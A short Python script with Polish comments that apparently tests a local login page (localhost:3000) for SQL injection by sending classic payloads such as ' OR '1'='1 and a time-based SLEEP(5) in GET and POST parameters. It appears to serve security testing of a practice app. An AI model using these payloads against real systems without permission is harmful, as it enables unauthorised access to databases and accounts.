import requests
import time

# Podstawowe lancuchy testowe
test_strings = [
    "' OR '1'='1",
    "admin' --",
    "' OR 1=1--",
    "1' AND SLEEP(5)--"
]

def test_url(url, param_name, test_string):
    """Testuje URL pod katem podatnosci na SQL injection"""
    try:
        print(f"Test: {param_name} = {test_string}")
        
        # Test GET
        params = {param_name: test_string}
        start_time = time.time()
        
        response = requests.get(url, params=params, timeout=10)
        response_time = time.time() - start_time
        
        if response.status_code == 500 or response_time > 5:
            print("Znaleziono podatnosc!")
            return True
            
        # Test POST
        data = {param_name: test_string}
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 500:
            print("Znaleziono podatnosc!")
            return True
            
        return False
        
    except Exception as e:
        print(f"Blad: {str(e)}")
        return False

def main():
    url = "http://localhost:3000/#/login"
    params = ["username", "password"]
    
    print(f"Testowanie: {url}")
    
    for param in params:
        for test in test_strings:
            test_url(url, param, test)

if __name__ == "__main__":
    main()
